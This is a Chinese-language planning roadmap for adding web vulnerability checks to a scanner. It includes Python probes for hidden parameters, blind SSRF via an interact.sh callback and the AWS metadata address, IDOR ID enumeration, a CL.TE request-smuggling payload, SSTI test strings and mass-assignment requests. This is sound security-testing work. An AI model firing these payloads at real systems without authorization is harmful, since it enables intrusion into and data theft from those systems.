# 高级扫描技术路线图（精简版）

本文档记录了可以集成到项目中的**高价值**安全扫描技术，已过滤掉低效或误报多的方法。

---

## 📋 筛选标准

### ✅ 保留的标准
- **真实漏洞** - 能导致实际安全风险
- **可验证** - 有明确的利用路径
- **高回报** - 发现后有价值
- **低误报** - 结果可靠

### ❌ 已移除的技术
- **HTTP 方法枚举** - PUT/DELETE 成功不代表有漏洞，需要具体业务逻辑验证
- **CORS 测试** - 大多数 CORS 配置问题无法直接利用，需要结合其他漏洞
- **WebSocket 测试** - 过于特定，覆盖率低
- **Prototype Pollution** - 需要深入代码分析，自动化效果差

---

## 🎯 保留的高价值技术

### 1. 参数模糊测试（Parameter Fuzzing）⭐⭐⭐⭐⭐

**优先级：** 最高  
**难度：** 中  
**预计耗时：** 3-4 小时实现

**为什么有价值：**
- ✅ 发现隐藏的管理功能（`?admin=true`）
- ✅ 找到调试接口（`?debug=1`）
- ✅ 暴露内部测试参数
- ✅ 可能导致权限绕过或信息泄露

**原理：**
使用字典暴力枚举隐藏的 URL 参数，发现未文档化的功能。

**能发现的漏洞：**
- 调试参数（`?debug=true`, `?test=1`）
- 管理员参数（`?admin=1`, `?role=admin`）
- 内部测试参数
- 未授权的访问控制参数

**常用参数字典：**
- Arjun 参数字典（~3000 个常见参数）
- SecLists 参数列表
- 自定义业务相关参数

**工具参考：**
- Arjun (https://github.com/s0md3v/Arjun)
- ffuf (https://github.com/ffuf/ffuf)
- ParamMiner (Burp 扩展)

**实现方案：**
```python
# 读取参数字典
with open('params.txt') as f:
    params = [line.strip() for line in f]

for param in params:
    response = requests.get(url, params={param: 'test'})
    if response.status_code != 404:
        log(f"[!] 发现隐藏参数: {param}")
```

**集成位置：**
- 在 URL 分类后，对带参数的 URL 进行测试
- 需要配置参数字典文件路径

---

### 2. SSRF 盲测（Blind SSRF）⭐⭐⭐⭐⭐

**优先级：** 最高  
**难度：** 高  
**预计耗时：** 4-5 小时实现

**为什么有价值：**
- ✅ 可以访问内网服务
- ✅ 读取 Cloud 元数据（AWS/GCP/Azure）
- ✅ 端口扫描内网
- ✅ 可能导致 RCE

**原理：**
使用外带（OAST - Out-of-Band Application Security Testing）技术检测盲 SSRF。

**能发现的漏洞：**
- 盲 SSRF 漏洞
- 内网服务探测
- Cloud 元数据访问（AWS EC2 metadata）
- 内部端口扫描

**测试方法：**
```python
# 使用 interact.sh
import requests

interact_domain = "xxx.interact.sh"
payloads = [
    f"http://{interact_domain}",
    f"https://{interact_domain}",
    f"http://169.254.169.254/latest/meta-data/",  # AWS metadata
]

for payload in payloads:
    requests.get(f"{url}?url={payload}")
    
# 检查 interact.sh 是否有回调
```

**工具参考：**
- Interactsh (https://github.com/projectdiscovery/interactsh)
- Burp Collaborator
- DNSLog

**集成位置：**
- 对接受 URL 参数的端点进行测试
- 需要外部回调服务支持

---

### 3. JWT 安全测试 ⭐⭐⭐⭐

**优先级：** 高  
**难度：** 中  
**预计耗时：** 3-4 小时实现

**为什么有价值：**
- ✅ alg:none 可直接绕过认证
- ✅ 弱密钥可暴力破解
- ✅ 令牌篡改可提升权限
- ✅ 影响所有使用 JWT 的系统

**原理：**
测试 JSON Web Token 的安全性，包括算法、密钥和签名验证。

---

### 4. IDOR（不安全的直接对象引用）自动化检测 ⭐⭐⭐⭐⭐

**优先级：** 最高  
**难度：** 高  
**预计耗时：** 6-8 小时实现

**为什么有价值：**
- ✅ **HackerOne 最常见的漏洞类型**
- ✅ 自动化工具很少覆盖
- ✅ 可能导致数据泄露、未授权访问
- ✅ 难以被 WAF/IDS 检测

**原理：**
通过修改资源 ID（如用户ID、订单ID）测试是否能访问其他用户的数据。

**能发现的漏洞：**
- `/api/users/123` → 改为 `/api/users/124` 能查看他人信息
- `/api/orders/456` → 改为 `/api/orders/457` 能查看他人订单
- `/api/documents/789/download` → 下载他人文档

**检测方法：**
```python
# 1. 收集带数字 ID 的 URL
# 2. 用当前用户访问获取基准响应
# 3. 尝试递增/递减 ID
# 4. 比较响应是否返回有效数据

import requests

base_url = "https://target.com/api/users/"
current_id = 123

# 获取基准响应
baseline = requests.get(f"{base_url}{current_id}", headers=auth_headers)

# 测试其他 ID
for test_id in range(current_id - 10, current_id + 10):
    if test_id == current_id:
        continue
    
    response = requests.get(f"{base_url}{test_id}", headers=auth_headers)
    
    # 如果返回 200 且包含敏感数据，可能存在 IDOR
    if response.status_code == 200 and len(response.text) > 0:
        log(f"[!] 潜在 IDOR: ID {test_id} 可访问")
```

**工具参考：**
- AuthMatrix (Burp 扩展)
- Autorize (Burp 扩展)
- custom Python script

**集成位置：**
- 在 URL 分类后，对包含数字 ID 的 API 端点测试
- 需要两个不同权限的账号（普通用户 + 测试用户）

---

### 5. HTTP 请求走私（HTTP Request Smuggling）⭐⭐⭐⭐

**优先级：** 高  
**难度：** 极高  
**预计耗时：** 8-10 小时实现

**为什么有价值：**
- ✅ **极难被检测到**
- ✅ 可绕过 WAF/安全控制
- ✅ 可能导致缓存投毒、会话劫持
- ✅ 大多数自动化扫描器不支持

**原理：**
利用前端代理和后端服务器对 HTTP 请求解析的差异， smuggle 额外请求。

**能发现的漏洞：**
- CL.TE 走私（Content-Length vs Transfer-Encoding）
- TE.CL 走私
- H2.CL / H2.TE 走私（HTTP/2）
- 缓存投毒
- 会话劫持

**检测方法：**
```python
import socket
import ssl

def send_smuggled_request(host, port, payload):
    context = ssl.create_default_context()
    conn = context.wrap_socket(socket.socket(), server_hostname=host)
    conn.connect((host, port))
    
    conn.sendall(payload.encode())
    response = conn.recv(4096).decode()
    conn.close()
    
    return response

# CL.TE 走私示例
smuggle_payload = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /admin HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "\r\n"
)

response = send_smuggled_request("target.com", 443, smuggle_payload)
if "admin" in response.lower():
    log("[!] 发现 HTTP 请求走私漏洞")
```

**工具参考：**
- http-request-smuggler (https://github.com/defparam/smuggler)
- Burp Suite HTTP Request Smuggler 扩展
- custom Python script

**集成位置：**
- 对使用反向代理的网站测试
- 需要检测前端/后端解析差异

---

### 6. Server-Side Template Injection (SSTI) ⭐⭐⭐⭐

**优先级：** 高  
**难度：** 中高  
**预计耗时：** 4-5 小时实现

**为什么有价值：**
- ✅ 可导致 **RCE（远程代码执行）**
- ✅ 常被误认为普通 XSS
- ✅ 影响 Jinja2、Twig、Freemarker 等模板引擎
- ✅ 自动化检测较少

**原理：**
在服务器端模板中注入恶意表达式，被执行后返回结果。

**能发现的漏洞：**
- Jinja2 SSTI（Python Flask）
- Twig SSTI（PHP Symfony）
- Freemarker SSTI（Java）
- Thymeleaf SSTI（Java Spring）

**检测 Payload：**
```python
ssti_payloads = [
    # Jinja2
    "{{7*7}}",  # 应返回 49
    "{{config}}",  # 泄露配置
    "{{''.__class__.__mro__[1].__subclasses__()}}",  # 列出类
    
    # Twig
    "{{7*7}}",
    "{{dump(app)}}",
    
    # Freemarker
    "${7*7}",
    "${.version}",
]

for url in api_endpoints:
    for payload in ssti_payloads:
        response = requests.get(f"{url}?name={payload}")
        if "49" in response.text or "config" in response.text.lower():
            log(f"[!] 潜在 SSTI: {url}")
```

**工具参考：**
- Tplmap (https://github.com/epinna/tplmap)
- Burp Suite SSTI 检测扩展
- custom Python script

**集成位置：**
- 对接受用户输入的模板渲染端点测试
- 重点关注搜索、个人资料、错误页面

---

### 7. Mass Assignment（批量赋值）⭐⭐⭐

**优先级：** 中  
**难度：** 中  
**预计耗时：** 3-4 小时实现

**为什么有价值：**
- ✅ 可提升权限（设置 `is_admin=true`）
- ✅ 可绕过业务逻辑
- ✅ 常见于 Rails、Laravel、Node.js 应用
- ✅ 容易被开发者忽略

**原理：**
向 API 发送额外字段，利用框架的自动绑定功能设置未预期的属性。

**能发现的漏洞：**
- 注册用户时设置 `{"role": "admin"}`
- 更新资料时设置 `{"is_verified": true}`
- 创建订单时设置 `{"price": 0.01}`

**检测方法：**
```python
# 测试批量赋值
normal_data = {"username": "test", "email": "test@example.com"}
malicious_data = {
    "username": "test",
    "email": "test@example.com",
    "role": "admin",  # 额外字段
    "is_admin": True,
    "credits": 999999
}

response = requests.post(
    "https://target.com/api/users",
    json=malicious_data,
    headers=auth_headers
)

if response.status_code == 201:
    # 检查是否成功设置了额外字段
    user_info = requests.get(
        "https://target.com/api/users/me",
        headers=auth_headers
    )
    if "admin" in user_info.text:
        log("[!] 发现 Mass Assignment 漏洞")
```

**工具参考：**
- Burp Suite Param Miner
- custom Python script

**集成位置：**
- 对 POST/PUT API 端点测试
- 添加常见敏感字段（role, admin, is_admin, price 等）

---

## 🎯 实施计划

### Phase 1: 高价值快速见效（2-3 周）
- ⏳ 参数模糊测试（发现隐藏功能）
- ⏳ SSRF 盲测（内网访问）

### Phase 2: 认证与授权（4-6 周）
- ⏳ JWT 安全测试（令牌绕过）
- ⏳ IDOR 自动化检测（未授权访问）

### Phase 3: 高级漏洞（6-10 周）
- ⏳ HTTP 请求走私（WAF 绕过）
- ⏳ SSTI 检测（RCE）
- ⏳ Mass Assignment（权限提升）

---

## 💡 为什么移除这些技术？

### ❌ HTTP 方法枚举
**问题：** PUT/DELETE 返回 200 不代表有漏洞，需要验证是否真的能修改数据。
**例子：** `PUT /api/users/1` 返回 200，但实际没有权限修改。
**结论：** 误报率高，需要人工验证每个结果。

### ❌ CORS 测试
**问题：** 大多数 CORS misconfiguration 无法单独利用，需要结合 XSS 或其他漏洞。
**例子：** `Access-Control-Allow-Origin: *` 本身不是漏洞，只是配置宽松。
**结论：** 低优先级，仅在发现 XSS 后才有价值。

### ❌ WebSocket 测试
**问题：** 覆盖率太低，只有少数网站使用 WebSocket。
**结论：** 投入产出比低。

### ❌ Prototype Pollution
**问题：** 需要深入理解应用代码，自动化检测效果差。
**结论：** 更适合手动渗透测试。

## 📚 参考资料

### 参数字典
- Arjun: https://github.com/s0md3v/Arjun
- SecLists: https://github.com/danielmiessler/SecLists

### 工具集合
- ProjectDiscovery: https://github.com/projectdiscovery
- OWASP: https://owasp.org/www-project-web-security-testing-guide/

### 学习资源
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackerOne disclosed reports: https://hackerone.com/hacktivity

---

*最后更新: 2026-05-20*
*状态: 规划阶段，待实施*
